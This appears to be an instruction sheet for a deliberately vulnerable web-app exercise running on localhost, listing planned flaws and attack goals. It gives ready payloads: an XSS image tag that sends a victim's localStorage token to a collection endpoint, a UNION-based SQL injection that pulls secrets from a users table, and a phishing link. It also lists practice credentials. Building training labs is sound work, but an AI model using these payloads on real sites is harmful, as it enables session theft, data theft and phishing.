Threats can be implemented:

1. SQL Injection on new user creation
2. Token stealing with violating CSP + XSS Injection
3. There is avatar upload - but user can upload an executable

There is special storage server, which you can use for temporary data containment: http://localhost:8080/side-service/ANYID. 
don't forget to change ID to any unique. You can store a string value by POST request and GET it after. This is in-memory storage, so may be wiped any second


Target is to do:

1. Steal any user's secret
2. Redirect users to the fishing site (use sap.com for example)
3. Drop Table
4. Steal all secrets

examples: XSS with IMG

Put it into the name field and login to another user - 
<img onerror="fetch(`http://localhost:8080/side-service/example`, {method: `POST`, body: localStorage.getItem(`me`)}).then(asd=>asd.toJson().then(res=>console.log(res)))" src="" />
stolen result will be visible at 
http://localhost:8080/side-service/example

example SQL Injection: %' UNION SELECT id, secret as name, null FROM users --
Linking to malicious site: <a href="http://malicious.com" target="_blank">Jack Black</a> instead of name

Credentials to distribute:

Username: Grace Lee, password: Y1z2A3b4C5_
Username: Hank Green, password: D6e7F8g9H0+
Username: Ivy White, password: I1j2K3l4M5=
Username: Jack Black, password: N6o7P8q9R0{
Username: Karen Scott, password: S1t2U3v4W5}
Username: Leo King, password: X6y7Z8a9B0[
Username: Mia Clark, password: C1d2E3f4G5]

TODO:
1. Add an app to demonstrate XSS
